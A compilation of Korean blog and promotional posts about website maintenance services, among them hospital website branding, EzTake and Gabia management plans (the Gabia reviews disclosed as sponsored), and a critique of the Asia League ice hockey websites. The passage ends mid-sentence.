[병원브랜딩마케팅실무] 책을 통해서도 홈페이지의 전략적 개발뿐 아니라 관리 역시 중요함을 강조해왔습니다. 홈페이지는 지속적으로 잠재고객들과 소통하는 마케팅의 최종 게이트일 뿐 아니라 병원의 성장 변화를 반영해 적절하게 전달해야 할 시의적인 브랜딩 툴이기도 하기 때문이죠.[다시 알아야할 병원마케팅]개원 당시 홈페이지를 개발한 이후 진료상품군을 변화시키게 되는 병원들이 적지 않습니다. 새로 추가되는 진료와 관련 서비스, 장비 도입에 의해 업그레이드된 진료상품의 어필 필요성 등이 생겨나는데 그것을 기존 홈페이지에서 콘텐츠화 하지 못하고 단순히 팝업 하나 띄우는 것은 마케팅 효과면에서도 부적절합니다.[병원브랜딩마케팅실무]​또한 병원광고나 마케팅을 통해 어필하고 있는 진료상품과 병원브랜드에 대한 상세페이지로서 홈페이지의 콘텐츠가 그닥 설득력을 갖추지 못하고 있는 경우들이 많은데요. 그래서 어떤 병원들은 별도의 랜딩페이지로 웹페이지를 하나 개설해 상담창을 붙여 유입을 하고자 하기도 하지만 결국 병원브랜드 홈페이지에서 관련 콘텐츠의 미비함이 드러나면 병원의 진정성이 의심을 받을 수 있습니다. 병원의 진료상품은 다양한 경쟁상황에 늘 처해 있습니다. 지역 동종 병원 간, 비용할인을 내세우는 공격적 마케팅을 하는 병원들과, 강남권이나 전국 네트워크 지점으로서의 맥락효과를 내세우는 경쟁병원들과, 양방과 한방처럼 이종 간 등등 다양한 경쟁군과 진료상품의 콘텐츠에 대해 비교우위의 설득력을 갖출 때 비로소 잠재고객 내원 가능성이 높아집니다. 이 기능을 하는 것이 병원홈페이지의 콘텐츠 페이지들이죠. 그래서 전략적 홈페이지 개발이 무엇보다 중요하고 개설 후에도 병원은 홈페이지 관리에 신경써야 합니다. 가급적 오픈 후에도 보완이 필요한 진료별 콘텐츠나 병원브랜드와 의료진에 대한 소개페이지의 경쟁력을 따져보고 부분적 보수가 적극적으로 이루어질 필요가 있습니다. ​무엇보다 병원 내부의 경쟁력 보완, 진료시스템이나 운영상의 변화 등이 이루어지는 경우 이를 홈페이지에 반영해야 합니다. 애초에 병원브랜딩 관점이 아닌 패턴화된 디자인 위주 홈페이지로 병원브랜드의 차별적 신뢰형성에 기여하지 못했다면 향후 마케팅효과를 고려해 리뉴얼을 검토할 필요가 있습니다만, 홈페이지를 오픈한 지 오래되지 않았고 비용부담도 느껴진다면 주요 페이지에 한해서만이라도 부분적인 콘텐츠 보강이 필요해보입니다. ​홈페이지 유지보수 차원으로 간단히 처리하게 되는 팝업도 전략적 접근이 필요합니다. 병원홈페이지의 팝업은 광고 기능의 마케팅툴로 봐야 합니다. 프로모션이든 병원의 업그레이드된 진료서비스나 신규영입한 의료진을 알리는 일이든, 또 변경된 진료시간을 전하는 것이든 이 정보들이 병원브랜딩에 기여하고 내원에 시너지효과를 내거나 혼란과 이탈을 최소화할 수 있도록 효과적으로 전달되려면 팝업의 카피라이팅과 디자인 역시 전략적으로 구성되어야 하죠. ​설득력이 높은, 그래서 전환효과가 더 나은 콘텐츠를 재개발 또는 추가 보완하는 것이 병원홈페이지 운영에서 중요합니다. 투비원에서는 이번에 홈페이지 전면개편이 어려운 병원, 기존 관리가 부실한 병원 홈페이지들을 합리적으로 그리고 전략적으로 부분 보강하는 [전략적 유지보수 프로젝트]를 정립했습니다. ​병원의 마케팅상황, 브랜딩 정도와 방향에 대해 살피고 홈페이지 로그 분석을 통해 실질적 유입상태, 전환 정도 등도 들여다보고 그 병원에 필요한 전략적 방향에서의 콘텐츠 보수에 대해 제안을 하게 됩니다. 병원과 협의 하에 월별 유지 보수 업무를 능동적으로 해나가는 것입니다. 물론 전략적 팝업광고 개발 등 관련 업무들도 지원합니다. ​병원은 월정액으로 진행함으로써 비용 부담을 덜 수 있습니다. 관련 문의와 상담은 투비원 홈페이지를 이용해 주세요.   ​​ 2003년 8월 28일 사업개시 이후로 줄곧 홈페이지와 프로그램개발과 관리의 한길만 꾸준히 달려왔습니다. 어느덧 2013년 만 10년이 다 되었습니다.저희 이지테이크는 지난 2007년 홈페이지 개발업체들의 무분별한 수주경쟁과 개발 이후의 관리소홀로 인하여 많은 업체들의 불만스러운 목소리에 귀기울이고 이를 해소코자 홈페이지관리 전문 사이트인 웹아웃소싱 ( www.weboutsourcing.co.kr ) 홈페이지를개설하게 되었습니다. 클릭해서 보시면 아시겠지만, 홈페이지관리만 전문으로 하는 사이트 입니다. 그리고 고객한분한분께 개인화된 인터페이스를 제공해 드리고 있습니다.;  1. 메인화면 구성도 개인에 최적화 되어 상단에는 개인정보가 한눈에 들어오고 좌, 우측으로 심플하게 비포서비스와 수정의뢰 항목이 리스트 됩니다.  여기서 잠깐!!홈페이지관리의 비포서비스는 고객이 요구하기전에 자체적으로 매월 정기적으로 게시판의 스팸,광고글이나,사이트 속도, 프로그램등을 점검하여 보고해 드리는 자체개발한 서비스 입니다. 웹아웃소싱의 최저관리비용은 3만원입니다. 여기에는 도메인,웹호스팅,웹메일,월1건의 유지보수,문서관리프로그램제공이 포함된 금액입니다. 유지보수부분이 많지 않은 업체에 적당합니다.  업체에 맞는 관리서비스 항목을 선택하신후 관리서비스안내 > 서비스신청에서 항목을 빠짐없이 기입합니다. 의뢰업체의 비전문가인 경우 또는 기존 관리업체에 전적으로 관리를 맡겼을 경우 ftp 정보, DB정보를 모르실 경우에는 기존관리업체의 연락처를 기입해 주시기 바랍니다. 서비스 신청이 완료되면 웹아웃소싱 이지테이크 담당자에게 문자가 발송이 되고 결제창으로 이동합니다.따라서 보다 신속하게 담당자가 정보를 확인하고 귀사에 연락을 취할수 있습니다.  해당 신청내용과 결제내역이 맞는지 다시한번 확인합니다  올더게이트 결제 연동페이지로 이동합니다.  결제가 완료되고 업체등록이 완료되면 로그인후 마이페이지를 클릭하시면견적서,청구서,정보,작업수정의뢰, 비포서비스 현황등을 한눈에 파악하실수 있습니다.이지테이크 에서는 견적서및 청구서도 온라인상에서 바로 확인이 가능합니다.  작업및 수정의뢰 화면입니다. 만약 관리범위를 초과한 건이라면 빨간색으로 본 수정건에 대해서는 비용이 청구될수 있다는 메세지가 표시 됩니다.하지만, 먼저 작업의뢰를 하시면 난이도및 의뢰건수를 파악하여 별도 비용이 추가될 경우 담당자가 연락을 할것입니다.   작업의뢰를 하게되면 해당 담당자 휴대폰으로 문자가 발송이 되고 또한, 작업처리 완료되면 자동적으로 의뢰업체 담당자에게 메세지가 전달되어 실시간으로 처리상태를 담당자(고객님)께 알려드립니다.  작업요청을 전달받은 담당자가 수정및 추가작업을 하게됩니다. 의뢰업체 담당자가 로그인 했을때의 메인화면 입니다. 상단의 한눈에 보이는 개인정보, 좌측에는 업체만의 개인화된 비포서비스,우측은 관리항목입니다. 스마트폰에서 m.eztake.com 을 입력하셔서 작업현황 > 작업및수정의뢰를 하실수 있습니다.홈페이지관리 전문기업 웹아웃소싱 이지테이크 www.weboutsourcing.co.kr 2013년 방문해주신 모든 분들 새해 복많이 받으시길 바랍니다.인연이된다면, 잘해드린다. 가격을 깍아드린다는 말보다는 옆에서 진정으로 도와 드리고 싶습니다.   홈페이지관리 - 이지테이크 웹아웃소싱  이지테이크에서 제공하는 웹아웃소싱서비스는 단순히 홈페이지관리만 하는것이 아닌,  홈페이지관리, 웹호스팅, 도메인, 웹메일, 데이터베이스 제공, 트래픽 무제한제공, 문서관리프로그램인 MyDoc 및 웹아웃소싱 전문 사이트인 웹아웃소싱 이지테이크 를 운영하고 있습니다.  기업에 꼭 필요한 솔루션 개발, 기업에 꼭 필요한 이지테이크 라는 모토로 지난 10년간 중소기업 현장에서 가장 필요하고, 쉽고 편리하게 사용할수 있는 툴을 웹기반인 홈페이지와 더불어 함께 제공하고 있습니다. - 웹기반 내부문서관리 프로그램 MyDoc - 도메인 하나쯤 무료로 제공해 드립니다.매번 도메인 별도관리, 호스팅별도 관리, 메일별도관리 힘드시지 않습니까?홈페이지관리, 이제는 모두 통합해서 추가비용없이 아웃소싱 하시기 바랍니다.귀하의 직원보다 훨씬 저렴한 금액에 훨씬 높은 퀄리티와 신속한 일처리로 보답을 할것입니다. - 도메인관리   - 웹메일도 기본으로 제공을 해드립니다.무료제공이라고 얕보지 마세욧, 기업에서 넉넉하게 쓸수 있는공간을 제공해 드립니다. 대용량지원까지 가능, 다국어 지원가능, 등등..직접 체험해 보시기 바랍니다.홈페이지관리도 하시고 웹메일도 덤으로 받아가세요.  - 홈페이지관리 전문 사이트 웹아웃소싱 이지테이크서비스내용1. 작업의뢰 접수시 담당자 문자발송2. 작업처리후 귀사 담당자에게 자동완료문자발송3. 원격지원서비스4. 1개월 1회 비포서비스 ( 사이트속도, 스팸성 광고문구등 점검및 삭제 )5. 작업의뢰건수 초과시 견적서 확인 ( 마이페이지 )6. 모든업무가 웹아웃소싱 홈페이지에서 체계적으로 홈페이지관리가 이뤄집니다.   - 고객로그인화면메인화면이 고객께 최적화 되어 비포서비스와 의뢰건수를 보여드리며, 미결금액과 서비스형태를 보여줍니다.  직원채용에 따른 인건비와 운영관리의 걱정, 소정의 비용으로 홈페이지관리 업무를 대신해 드립니다. 검증되지 않은 퀄리티와 고용으로 인한 추가비용 발생, 이러한 문제를 저렴한 비용으로 이지테이크에 맡겨 보세요.실제 고용된 웹디자이너, 프로그래머 이상으로 전담하는 담당자가 정성껏 관리해 드릴것입니다.귀사의 앞날에 무궁한 발전과 행운있기를 빕니다.   홈페이지 관리는 가비아 홈페이지 관리대행 서비스로 홈페이지 만들기는 했는데 관리가 안되시죠?쇼핑몰 만들었는데 어떻게 수정해야 할지 막막하기도 하고요.주위에 컴퓨터 잘하는 사람, 웹 개발을 좀 해본 사람이 있다고요?그 사람들에게 부탁하는 것도 한두번이죠. 번거로운 홈페이지 관리, 홈페이지 관리대행으로 한 번에!가비아 홈페이지 관리대행 서비스가 내건 슬로건.호스팅, 유지보수, 보안존 지원홈페이지 운영에 필요한 시스템적인 부분은 다 준비해주네요. 월 5만원의 베이직 서비스로 도메인, 호스팅, 보안에간단한 유지보수까지 가능합니다.기업이나, 보안이 필요한 홈페이지의 경우스탠더드, 프리미엄 서비스를 이용하시면조금 더 다양한 서비스를 제공받을 수 있네요.가비아 홈페이지 관리대행 서비스를 사용하시려면,4단계의 서비스 신청 절차를 거치면 됩니다. 간단히 신청정보 입력하시고. 결제할 금액 확인하시고, 결제정보 입력하신 후, 관리에 필요한 정보를 입력하시면,가비아 홈페이지 관리대행 서비스 신청이 완료됩니다.서비스 신청정보 확인하시고,이제 본격적으로 사용해보는 일만 남았네요. 마지막으로 서비스 이용대금을 결제하시면 됩니다. 쇼핑몰을 해볼까?가비아 무료쇼핑몰을 신청해둔게 생각나 접속해 봤어요.아무것도 수정된 것 없는기본 제공된 템플릿 그대로~가비아 홈페이지 관리대행 서비스를 이용해서간단한 수정사항을 요청해보려 합니다.관리대행에 작업요청 버튼 클릭!! 작업 요청내용 입력하고 확인!! 작업요청이 접수상태로 확인 됩니다. 서비스 이용현황에서사용한 서비스와 남은 서비스를 확인 가능하고요. 다시 쇼핑몰에 접속해보니짜잔~ 쇼핑몰 로고가 변경되어 있습니다. 좀전에 요청한 작업이 완료되었다고 표시되고요.쇼핑몰 운영하실 때,초기에 업체에 맡겨 개발을 하신 후간단한 수정사항 하나 반영하기 힘든 분들도 계실거에요.가비아 홈페이지 관리대행 서비스로쉽게 쉽게 홈페이지 만드시고 관리하세요.이 글은 홈페이지 관리대행 서비스를 소개하면서 가비아로부터 경제적 대가를 지원받아 작성한 포스팅 입니다. 봄봄봄봄~ 봄이 왔어요!이제 점점 옷이 얇아지면서 더이상 겨울 옷은 입질 못하겠어요~바람이 불면 쌀쌀하긴 하지만 햇볕이 너무나 따뜻해서 나들이 가고 싶어지네요!안그래도 저번 주말에 친구들하고 공원으로나들이를 했는데 어찌나 좋던지~!! 여러분들은 뭐하고 주말을 보내셨나요? 공원에서 자전거 타다가 자전거 언넝 갔다놓고친구랑 맥주사서 벤치에 앉아서 꼴깍꼴깍~ 꼬미는.. 주량이 그렇게 쎄지 않아요..친구한테 먹어달라고 부탁했..  헤롱 거려도 우리 인크리브의 병원홈페이지 유지보수 관리에 대해서 말씀은 드려야겠죠!홈페이지만 제작한다고 모든게 끝이 난걸까요?높은 지위에 있는 사람들은 높은 지위에 오르면 그게 끝이라고 생각할까요?전혀 아니죠!그 자리를 지키기위해 관리하면서 맡은바 임무를 성실히 수행하죠. 병원홈페이지도 마찬가지!!홈페이지를 제작하고나서 아무런 유지보수 없이 그냥 덩그러니 냅둔다면..?이상 오류 등이 생길 경우 홈페이지를 방문한예비고객들이 불편함을 겪고 이탈할 가능성이 높고요즘 트렌드와 전 트렌드는 차이가 있기 때문에 시대에 흐름에 맞는 유지보수가 필요하죠.  홈페이지는 살아있다고 해도 과언이 아닌데멈추면 그 생명의 불씨는 꺼지게 됩니다.그렇기 때문에 지속적인 업데이트를 통해서 관리를 하는 것이 필요하고이를 통해 경쟁사보다 우위를 확보하게 되는 것이죠. 이렇게 되면 자연스럽게 병원의 브랜드 인지도와 함께 덩달아 매출이 상승될 확률은 높아지는 것!  이렇게 병원홈페이지 유지보수가 필요한 분들은 어떤 케이스가 있을까요? 1. 타 관리 업체와 의사소통이 어려운 분!2. 사이트는 있지만 전문인력을 두기 어려울 때3. 일반적인 업무를 통해서 홈페이지 관리를 신경쓰는게 어려울 때4. 웹사이트 제작후에 별도의 운영관리가 필요할 때5. 인터넷이나 컴퓨터, 그래픽 등의 분야에 지식을 갖지않아 어려움을 겪고 계실 때6. 병원홈페이지를 보다 체계적으로 운영을 하고 싶을 때  이때 인크리브는 레시피를 통한 진단을 내려병원홈페이지 유지보수 관리를 진행하게 되는데요.웹컨설턴트가 모니터링을 하고 분석자료를 제공하면서 포괄적인 컨설팅 서비스를 진행하게 되죠.그리고 웹기획자는 고객에 맞는 유지보스나 기용성을 향상시킬 수 있게 하고웹디자이너는 이를 통해 좀 더 머무를 수 있도록디자인적으로 차원높은 사이트를 제공하게 됩니당. 마지막으로 웹프로그래머는 홈페이지의 성능이나 보안 신뢰 등을최적화시킬 수 있도록 시스템화하여 진행합니다.병원홈페이지 유지보수 관리로 아직도 골머리를 앓고 계신다거요?인크리브 레시프를 한번 펼쳐보세요! 홈페이지관리 - 가비아에서 뚝딱뚝딱 홈페이지유지보수를    안녕하세요. ' 노마크 ' 입니다.     요즘은 조그마한 회사도, 하다못해 조그마한 커피숍을 운영하거나 펜션을 운영하거나, 집앞 꽃집을 운영하더라도 홈페이지 제작이 거의 필수입니다. ​​ 전화로 이것 저것 상담하고 안내하던 시대는 훌쩍 많이 지나버렸죠. ​​ 헌데, 이 홈페이지라는게, 어렵다면 어렵고 쉽다면 쉽지만.. 제작하는것으로 끝나지 않고 유지보수까지 필요하기 때문에 기술뿐만 아니라 시간도 의외로 많이 소모됩니다.   ​ 이 홈페이지 관리를 저렴하게 대행해주는 서비스가 있어 소개합니다. +_+  가비아의 홈페이지 관리 서비스 !  ​           ​ ​​가비아 홈페이지에서 ​웹사이트 - 홈페이지관리대행 서비스를 선택하여​신청하면 저렴한 가격으로 다양한 수정사항을 빠르게 처리해주는​서비스를 이용할 수 있습니다.​​ ​​​​ ​​​​​​서비스를 정상적으로 신청하면, ​My 가비아 메뉴에서 현재 이용중인 서비스들에 대한 리스트를 확인하고,​홈페이지 관리대행 서비스정보를 확인할 수 있습니다.​ ​​​​​​​​​ ​​​​기본 템플릿이 적용되어 있는데, 원하는 디자인으로 한 번에 변경이 가능합니다.​그건 아래에서 설명하기로 하고, ​일단 원하는 오탈자 수정이나 이미지 변경 하고싶은 부분을 메모해두고,​한 번에 신청하면, 바로 다음날 처리가 완료되는 서비스 !!​​​​​​​​​​아래 요청내역에 제가 신청한 사항들이 접수 처리 되었네요.​​바로 다음날 수정이 완료된다고 하니, ​이제 기다리기만 하면~​​​​​​​​​​제가 요청한 작업은 2가지 였습니다.​  ​​1. 좌측 상단에 로고를 다른 이미지로 교체해 주세요.​2. 가운데 배너 영역에 타이틀을 변경해 주세요.​​​​​​​​​​ ​​오호~ 다음날 바로 작업상태가 완료로 변경 되었네요.​어디 요청한 사항이 잘 반영 되었는지 ​확인해볼까요~​​​​ ​​​​​  ​​정확하게 요청한 사항이 반영 되었네요~​​로고도 바뀌고, 배너 타이틀도 변경되고~​ ​​이렇게만 빠르고 쉽게 변경된다면 참 편하고 좋네요 ^^ ​​​확인전화까지 친절하게 해주시니.​더욱 신뢰할 수 있엇습니다.​​​​​​​​​​​또한 기본 밑바탕이 되는 템플릿도 변경이 가능 한데요~​​​​서비스 정보에서 디자인 템플릿을 통해​다양한 ​샘플 템플릿을 확인할 수 있는데, 어느 것 하나 대충 만든게 없을 정도로​고 퀄리티의 디자인 입니다.​   ​​​ ​​​기업/제품과 관련한 템플릿 부터~ ​  ​​ ​​ ​교육/금융/생활/음식/육아 등등​​다양한 카테고리로 본인의 기호나 상황에 필요한 형태의​디자인을 선택하여 적용이 가능하다는 사실.​​이 모든걸 직접 제작하거나 혹은 제작의뢰하게 되면, ​꽤 큰 지출이 필요한데,​​이렇게 하니, 적용도 빠르고 비용도 절감됩니다. ​​ ​​​​​​원하는 템플릿을 선택했다면, 적용했을 때​​약 5~10분 이후 신청한 도메인으로 적용되어 있는 모습을 확인할 수 있습니다. ' ㅇ '​​​​​​​​ ​​​​​자~ 제가 선택한 바로 그 템플릿이 약 7분 후에 적용 완료!!​​이 기본 바탕에, 로고나~ 이미지나~ 문구등만 제가 원하는대로 바꾸면,​내 홈페이지 완성~​​​전 템플릿을 고르고~ 이미지나 텍스트 변경을 요청하고~​다음날 확인하면 끝~​​​홈페이지 제작 참 간단하죠?​​물론, 한 달간 언제라도 다른 것에 대해 수정이 가능함은 물론~​​​방문자나 회원관리, 게시판 관리 등도 모두 가비아 관리 서비스에서 이용이 가능합니다.​     어떤가요~?   특별한 기술이 없어도 적은 비용으로 많은 시간을 절약할 수 있는 좋은 서비스로 생각되는 홈페이지 관리대행 이였습니다.   ​​  ↓가비아 홈페이지관리대행https://maintain.gabia.com/service﻿ 이 글은 홈페이지 관리대행 서비스를 소개하면서 가비아로부터 경제적 대가를 지원받아 작성한 포스팅 입니다.  ​​​​ 아이스하키 발전과 대중화를 위한 필수 과제   아이스하키는 북미나 유럽에서 매우 인기 있는 대중 스포츠입니다. 캐나다를 예로 들자면 이 나라 학생들은 아이스하키를 기본 운동으로 즐기고 있으며 이를 즐기기 위한 아이스링크도 도처에 있습니다. 즉, 아이스하키가 우리나라 조기축구와 같은 국민스포츠로 자리잡고 있는 셈입니다. 물론 나라마다 특수성은 있습니다. 아이스하키를 대중적으로 즐기는 나라들은 공통적으로 추운 나라들입니다. 빙상스포츠가 자연스레 발전할 수 있었던 나라들이죠. 그에 비하면 우리나라는 다르기는 합니다. 아이스링크를 유지하는 것부터 많은 비용이 들다보니 아이스하키를 대중화시키는데 제한적일 수밖에 없긴 합니다.이런 특수성을 감안하더라도 우리나라의 아이스하키 실정은 초라합니다. 90년대 말까지 그래도 3～4개 실업팀이 있었지만 IMF를 기점으로 한라를 제외한 모든 실업팀이 사라져버리고 말았습니다. 그나마 남은 한라 역시 IMF때 만도를 다른 회사로 넘기고 그룹이 해체되는 극한의 상황에서 해체 위기를 맞았지만 구단주의 의지로 인해 살아남을 수 있었습니다.이웃 나라인 일본도 상황은 비슷합니다. 상당수 구단이 해체하면서 리그 자체를 제대로 운영할 수 없는 지경에 이르렀습니다. 한, 일 양국 모두 아이스하키를 지속하기에 힘든 시간을 보냈던 것이죠.이렇듯 침체기에 빠진 아이스하키를 부활하고자 하는 움직임이 2003년부터 있었습니다. 살아남은 한라가 주도해 한, 일 통합리그를 결성한 것이죠. 이것을 기초로 2004년 중국이 리그에 합류하면서 현행 아시아리그 체계가 잡혔습니다. 2011～2012 시즌인 올 시즌까지 총 8번의 시즌이 열렸으며, 이번 시즌도 이제 약 1/3 정도 경기를 치렀습니다.그런데 아시아리그로 인해 범아시아권 아이스하키 저변이 넓어졌을까요? 벌써 8회 째 시즌을 맞이하고 있지만 저는 여전히 아이스하키 저변을 넓히는 것에는 미치지 못했다고 생각합니다. 겨우 실업팀 2개만 유지하고 있는 우리나라지만, 이것이 우리나라에 국한한 문제만은 아닙니다. 아시아리그 사무국이 있는 일본 역시 골수팬은 많지만 신규 팬 유입이 적다고 합니다.무엇이 문제일까요? 저는 이 자리를 빌어 현행 아이스하키 업계의 문제를 진단하고, 아이스하키가 저변을 넓히고 대중화하기 위해 반드시 선행해야 할 과제를 펼쳐보고자 합니다. 홈페이지 관리, 마케팅 활성화의 필수 요건 현대 마케팅은 무척 다양화하고 있습니다. 단방향 매스미디어를 통한 홍보가 전부였던 예전에는 TV 광고, 중계방송, 신문 기사나 광고 등이 전부였지만, 인터넷이 발달하고 소셜 미디어가 급부상한 오늘날은 다양한 미디어를 통해 홍보하고, 양방향 특성을 살려 상호 소통해야 합니다. 복잡하죠? 하지만 아이스하키 업계에서 이것은 다음 과제일 뿐입니다. 현재 아이스하키 업계는 이에 앞선 기초조차 제대로 이행하고 있지 않으니까요. 그것이 바로 홈페이지를 통한 인터넷 홍보입니다.- 무성의한 아시아리그 홈페이지    아시아리그 홈페이지는 http://www.alhockey.com입니다. 그리고 대중적으로 인기를 모으고 있는 아이스하키 리그는 NHL입니다. 그들의 홈페이지는 http://www.nhl.com이죠. 국민스포츠로 사랑받고 있는 NHL과 이제 겨우 걸음마를 하고 있는 아시아리그를 비교한다는 것이 무리수일지는 모르겠습니다만, 아이스하키의 저변 확대를 바라는 아시아리그라면 적어도 NHL의 1/10이라도 따라가는, 아니 그리 하려고 시도라도 해야 하지 않을까 합니다. 그렇다고 한다면 적어도 지금보다는 크게 달라질 수 있지 않을까요?  우선 NHL 사이트를 살펴보겠습니다. 첫 화면부터 다양한 볼거리가 눈과 호기심을 자극합니다. 뉴스, 사진, 비디오 등 방대한 볼거리가 오랜 시간 놀 거리를 제공해줍니다. 영어를 할 줄 아는 사람이 아니더라도 사진, 동영상 위주의 볼거리에 충분히 매료될만합니다. 그렇다면 아시아리그 사이트는? 직설적으로 말하자면 참 초라합니다. 팀 소개, 경기 일정, 뉴스가 전부입니다. 첫 화면에 돌아가는 사진조차 일반 관람객들이 얼마든지 찍을 수 있을만한 아마추어 수준에 머무릅니다. 무성의한 개인 홈페이지를 보는 듯한 구성에 도무지 흥미를 느낄 수 없습니다. ‘이것은 뭐 재미도 없고 감동도 없고…’라고 할까요? 명색이 우리나라에서 발기한 리그임에도 한국어 페이지조차 없다는 것 역시 의아한 부분입니다. 아시아리그 사이트는 영어와 일본어 페이지로만 이루어져 있습니다. 한, 일 통합리그로 시작해 중국이 참가하고, 러시아도 참여했었던 범아시아권 리그임에도 엉뚱하게 영어 사이트와 일본어 사이트가 전부입니다. 한국어 페이지 뿐 아니라 중국어 페이지도 없습니다. 그나마도 최신 정보는 오로지 일본어 사이트로 집중되어 있고 영어 사이트에는 그저 랭킹과 경기 일정이 최신 업데이트의 전부입니다.- 국내 구단 홈페이지의 현주소    이번에는 국내 구단 상황을 짚어보겠습니다. 아시아리그에 참가 중인 국내 구단은 한라와 하이원 두 팀입니다. 한라는 한라그룹 회장이자 구단주인 정몽원 회장의 전폭적인 지원 아래 안양에 연고를 두고 꾸려가고 있습니다. 아시아리그에서는 2009～2010 시즌 통합 우승, 2010～2011 시즌 프리블레이즈와 공동우승으로 2연패를 달성했고, 이번 2011～2012 시즌도 우승을 향해 순항하고 있습니다.  그룹 회장의 전폭적인 지원이 따라서일까요? 한라 구단이 운영하는 홈페이지(http://www.anyanghalla.com)는 여러 모로 활발합니다. 팬들과 소통 공간은 물론 페이스북, 트위터와 같은 소셜 미디어를 활용해 경기 소식과 선수 소식 등을 전하고 있습니다. 원정 경기가 있을 때는 트위터를 통해 경기 소식도 전해줍니다.   하이원은 다소 다릅니다. 하이원은 여러 스포츠단을 운영하고, 아이스하키팀 역시 스포츠단의 일부입니다. 2004년 창단했고 2005～2006 리그부터 참가해 지금까지 6회째 시즌을 맞이하고 있습니다. 하이원의 홈페이지는 스포츠단 홈페이지에 속해 있습니다. (http://sports.high1.co.kr/greetings/html.high1) 3년 전 구단 홈페이지를 리뉴얼하고 경기 일정이나 사진 등을 간간이 업데이트하는 중입니다. 하지만 하이원 페이지는 사실상 ‘죽어있는’ 페이지나 다름 없습니다. 최신 정보는 찾아볼 수 없고 사진도 오래 전 것들 뿐입니다. 홈페이지 상태만 봐서는 지금 아이스하키 구단을 운영하고 있는지조차 가늠할 수 없습니다.  - 홈페이지 활성화와 질적 향상을 선행해야  문제는 이렇습니다. 그리고 문제 속에 답이 있습니다. 무엇에 대한 답? 아이스하키가 발전하고 보다 대중화하기 위한 답입니다. 제 개인 생각에 머무를 수도 있겠지만 대부분 공감할만한, 즉 너무나 당연한 것들입니다. 우선 아시아리그 홈페이지. 홈페이지는 대중화를 위한 초석입니다. 누구나 쉽게 접하고 흥미를 가질 수 있어야 합니다. 그를 위한 최우선 과제는 언어 장벽 해소입니다. 쉽게 말해 현지 언어로 이루어진 홈페이지가 있어야 한다는 것이죠. 우리나라 입장에서는 한국어 페이지, 중국 입장에서는 중국어 페이지가 반드시 필요합니다.  사실 이것은 매우 쉬운 일입니다. 홈페이지를 구성하고 있는 디자인 요소에서 영어나 일본어를 한국어나 중국어로 바꿔주는 작업만 해주면 됩니다. 단 1회성으로 끝날 일입니다. 간단하죠? 그래서 더 아쉽습니다. 또 하나는 업데이트입니다. 지금은 심지어 영어 페이지조차 제대로 업데이트하고 있지 않습니다. 그저 일본어로 올라오는 소식처럼 공통 소식은 똑같이 올리고 로컬 소식은 각 나라별로 업데이트하면 될 것인데 그러지 못하고 있습니다. 빠른 업데이트는 리그가 활발함을 증명하죠. 활발히 활동하면 사람들이 관심을 갖기 시작합니다. 이렇게 시작해야 합니다. 각 구단 별로 각각 업데이트하고 있는 사진 동영상 등을 리그 홈페이지에서 볼 수 있도록 일목요연하게 업데이트해 쉽게 검색할 수 있도록 한다면 하루가 다르게 업데이트되는 모습을 보여줄 수 있을 겁니다. (참고: http://cupsend.blog.me/140143521547 ) 이것은 아이스하키에 관심을 두는 사람들에게 유용한 정보가 됩니다. 사람들은 이 정보를 구하고자 각 구단 홈페이지가 아닌 아시아리그 홈페이지를 찾을 것이고 그 중 절반만이라도 관심을 보인다면 지금보다 훨씬 많은 팬을 확보할 수 있을 겁니다. 구단 홈페이지는 어떨까요? 먼저 한라와 하이원 두 구단을 비교해 문제를 짚어보겠습니다.      리뉴얼한 하이원 홈페이지는 카테고리 구성에 있어 높은 완성도를 갖고 있습니다. 선수 소개에 배치한 개인 사진 등은 경기를 관람하는 관객들에게 더할 나위 없이 좋은 정보입니다. 하지만 이 홈페이지가 버려져 있습니다. 업데이트라고는 고작 시즌 전 선수 및 코칭스텝 업데이트가 전부입니다. 그밖에는 알림마당을 통한 일정 업데이트 정도? 더 황당한 것은 메인 페이지에 업데이트하고 관리해야 할 사진, 동영상 등 콘텐츠가 팬카페나 매니저 개인 블로그를 통한다는 것입니다. 공식 페이지는 죽어있고 팬카페나 개인 블로그가 구단을 대변한다? 한심할 노릇이죠. 페이스북, 트위터와 같은 소셜 미디어도 계정은 있는 듯하나 활동은 없습니다.  상대적으로 효율적이지 못한 구조라고 판단합니다만 한라의 홈페이지는 운영의 묘가 돋보입니다. 업데이트도 비교적 활발하고 트위터나 페이스북을 통한 소통도 열심입니다. 일본팀에서 한라의 홈페이지 운영을 롤모델삼아 운영하고 있다는 것은 그만큼 한라가 홈페이지 운영에 있어 적극적임을 시사하는 것이겠죠. 하지만 한라 역시 부족한 부분은 눈에 많이 보입니다. 올라오는 정보는 비교적 빠르고 활발합니다만 업데이트되는 정보의 질적 수준이 문제입니다. 공지사항은 여러 정보가 뒤죽박죽 섞여있어 재분류할 필요가 있고, 자유게시판은 팬 컬럼 게시판과 나뉘어져 있으면서 두 게시판 성격이 모호해 통합할 필요가 있습니다.     홈페이지의 얼굴이라고도 할 수 있는 포토월 사진은 정작 2010년 7월 업데이트로 그친 것 역시 눈에 거슬립니다. 업데이트할 값어치를 못 느낀다거나 그럴 여력이 없다면 과감히 없애는 편이 나을 것입니다. 즉, 한라는 홈페이지를 잘 운영하고 있지만 그저 단순히 ‘운영’만 하고 있다는 것이 문제입니다. 하이원은 구단을 꾸리는 임무 중 하나로 홈페이지 관리에 관심을 둬야 할 것입니다. 현행 홈페이지 담당자가 좀 더 공부를 하든 전문 인력을 보강하든 ‘죽어있는’ 홈페이지를 살려내야 합니다. 실업팀의 존속 이유는 관심 인구 유입을 통한 모기업 이미지 홍보일 터, 이를 위해서는 당장 홈페이지 업데이트부터 활발히 해야 할 것입니다. 한라는 현행 홈페이지 운영을 한 단계 업그레이드해야 합니다. 기존 틀 안에서만 행하고 있는 관리 차원을 넘어 방문객들이 눈으로 보고 즐길 수 있는 정보를 업데이트하는데 주력해야 합니다. 사람들은 눈이 즐거워야 지루함을 느끼지 않고 봅니다. 단지 홈페이지 관리 인력 말고도 이를 충족시켜줄만한 전문 인력을 들여 업데이트하는 정보의 질적 수준을 높여야 합니다. 정보의 질적 수준 문제는 다음편에 자세히 다루겠습니다. 다음 편에서는 팬 이벤트와 사진에 관한 이야기를 이어갑니다.네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가홈페이지관리가 제대로 안되고 홈페이지로써의 기능을 충실히 수행을 못할때  항상 욕을 먹는곳은 홈페이지관리업체 또는 제작업체일것이다.하지만, 따지고 보면 무작정 관리업체만 탓할게 아니다. 상업적으로 만들어진 홈페이지는 목적에 충실하게 수익또는 영업매체로써 역할을 제대로 해야 한다. 하지만 대부분 그냥 남들 있으니까 하는정도에 극히 미미한 